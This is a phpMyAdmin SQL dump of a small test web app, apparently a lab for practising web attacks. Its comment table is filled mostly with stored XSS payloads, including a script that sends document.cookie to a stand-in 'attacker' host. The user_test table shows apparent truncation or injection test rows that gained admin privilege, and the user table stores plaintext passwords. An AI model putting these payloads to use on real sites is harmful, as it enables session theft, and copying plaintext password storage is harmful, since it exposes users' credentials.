-- phpMyAdmin SQL Dump
-- version 4.1.14
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: Nov 28, 2015 at 09:49 PM
-- Server version: 5.6.17-log
-- PHP Version: 5.5.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `web_app`
--

-- --------------------------------------------------------

--
-- Table structure for table `comment`
--

CREATE TABLE IF NOT EXISTS `comment` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `comment` varchar(500) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=93 ;

--
-- Dumping data for table `comment`
--

INSERT INTO `comment` (`id`, `comment`) VALUES
(1, 'This is a good website'),
(2, '2sadawe'),
(3, 'earea'),
(4, 'earear'),
(5, 'I like your website'),
(6, 'teach me more'),
(7, '<script>alert("hi")</script>'),
(8, '<script>alert("hi")</script>'),
(9, '<script>window.open("www.google.com")script>'),
(10, '<script>window.open("www.google.com")script>'),
(11, '<script>window.open("www.google.com")script>'),
(12, '<script>window.open("www.google.com")script>'),
(13, '<script>window.open("www.google.com")script>'),
(14, '<script>window.open("www.google.com")</script>'),
(15, '<script>window.open("www.google.com")</script>'),
(16, '122'),
(17, '<script>window.open("www.google.com")</script>'),
(18, '<script>alert("1")</script>'),
(19, 'fearae'),
(20, 'erewr'),
(21, '2121'),
(22, '2121'),
(23, '2121'),
(24, '2121'),
(25, 'fearea'),
(26, 'fearea'),
(27, 'eraea'),
(28, 'eraa'),
(29, 'feaera'),
(30, 'erarea'),
(31, '21212'),
(32, 'dwaewa'),
(33, 'feare'),
(34, 'ewraerearfeaf'),
(35, 'earear'),
(36, 'fearea'),
(37, 'fearea'),
(38, 'erearea'),
(39, 'ersaer'),
(40, 'I like you'),
(41, '<script>alert("1")</script>'),
(42, '122'),
(43, '<script>window.open("www.google.com")</script>'),
(44, 'alert(1)'),
(45, 'This is good'),
(46, 'This is good'),
(47, 'This is good'),
(48, 'This is good'),
(49, 'This is good'),
(50, 'This is good'),
(51, '<script>window.open("www.google.com")</script>'),
(52, 'qwwereqrq'),
(53, '1234'),
(54, '<script>alert("1")</script>'),
(55, '<script>alert("1")</script>'),
(56, '121331'),
(57, '<script>alert("1")</script>'),
(58, 'fdare3w'),
(59, '<script>alert("1")</script>'),
(60, 'ear3ea'),
(61, '<script>alert("attacked")</script>'),
(62, '<script>alert("attacked")</script>'),
(63, '<script>alert("attacked")</script>'),
(64, '123'),
(65, '123'),
(66, '123'),
(67, '<script>alert("1")</script>'),
(68, '<script>alert("1")</script>'),
(69, '<script>alert("1")</script>'),
(70, '<script>alert("1")</script>'),
(71, '<script>alert("1")</script>'),
(72, '<script>alert("1")</script>'),
(73, '<script>alert("1")</script>'),
(74, '<script>alert("1")</script>'),
(75, '<script>alert("1")</script>'),
(76, '<script>alert("1")</script>'),
(77, '<script>alert("1")</script>'),
(78, '123'),
(79, '123'),
(80, '123'),
(81, '<script>window.location="http://attacker/?cookie="+document.cookie</script>'),
(82, '<script>window.location="http://attacker/?cookie="+document.cookie</script>'),
(83, '<script>window.location="http://attacker/?cookie="+document.cookie</script>'),
(84, '<script>alert("1")</script>'),
(85, '<script>alert("1");</script>'),
(86, '<b onmouseover=alert("Wufff!")>click me!</b>'),
(87, '1212'),
(88, '<b onmouseover=alert("Wufff!")>click me!</b>'),
(89, '<b onmouseover=alert("Wufff!")>click me!</b>'),
(90, '<b onmouseover=alert("Wufff!")>click me!</b>'),
(91, '1`21231341'),
(92, '1`21231341313');

-- --------------------------------------------------------

--
-- Table structure for table `store`
--

CREATE TABLE IF NOT EXISTS `store` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `product_name` varchar(50) NOT NULL,
  `product_price` int(10) NOT NULL,
  `product_number` int(10) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=9 ;

--
-- Dumping data for table `store`
--

INSERT INTO `store` (`id`, `product_name`, `product_price`, `product_number`) VALUES
(1, 'iphone6s', 699, 12079),
(2, 'DELL laptop', 800, 200),
(3, 'Epson Home Theater Projector', 1999, 333),
(4, 'Sennheiser Headphone', 224, 2123),
(5, 'Nikon D3200 Digital SLR Camera', 396, 2133),
(6, 'Panasonic LUMIX digital Camera', 297, 3232),
(7, 'Arlo HD Camera', 120, 1212),
(8, 'Kindle', 49, 3332);

-- --------------------------------------------------------

--
-- Table structure for table `user`
--

CREATE TABLE IF NOT EXISTS `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL,
  `email` varchar(50) NOT NULL,
  `number` varchar(30) NOT NULL,
  `password` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=6 ;

--
-- Dumping data for table `user`
--

INSERT INTO `user` (`id`, `name`, `email`, `number`, `password`) VALUES
(1, 'Alex', 'alexz@mivatek.com', '3146818576', 'abc123'),
(2, 'Mark', 'mark@hotmail.com', '5108997766', 'qwerty'),
(3, 'admin', 'admin@gmail.com', '3146818576', 'admin'),
(4, 'alice', 'alice@gmail.com', '5018887756', 'monkey'),
(5, 'Tom', 'tom@yahoo.com', '5018885678', 'ilikedog');

-- --------------------------------------------------------

--
-- Table structure for table `user_test`
--

CREATE TABLE IF NOT EXISTS `user_test` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL,
  `password` varchar(50) NOT NULL,
  `privilege` int(2) NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=37 ;

--
-- Dumping data for table `user_test`
--

INSERT INTO `user_test` (`id`, `name`, `password`, `privilege`) VALUES
(1, 'admin', 'admin', 10),
(2, 'alex', 'admin', 1),
(3, 'mark', 'admin', 1),
(4, 'jack', 'admin', 1),
(9, 'asdf', 'admin', 1),
(10, 'daniel', 'admin', 1),
(12, 'A" ', 'admin', 10),
(14, 'A ', 'admin', 10),
(16, 'avc', 'admin', 1),
(17, 'cvvv', 'admin', 1),
(18, 'cvvv', 'admin', 1),
(19, 'dddd', 'admin', 1),
(20, 'ewrqwhoidas', 'admin', 1),
(21, 'earfaefea', 'admin', 1),
(22, 'A ', 'admin', 10),
(23, 'A ', 'admin', 10),
(24, 'C ', 'admin', 10),
(25, '1dsada', 'admin', 1),
(26, 'fdafea', 'admin', 1),
(27, 'earea', 'admin', 1),
(28, 'A ', 'admin', 10),
(29, 'A ', 'admin', 10),
(33, 'sam', '123', 1),
(34, 'sam ', ' B ', 10),
(35, 'A ', ' B ', 10),
(36, 'fff', 'sss', 1);

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
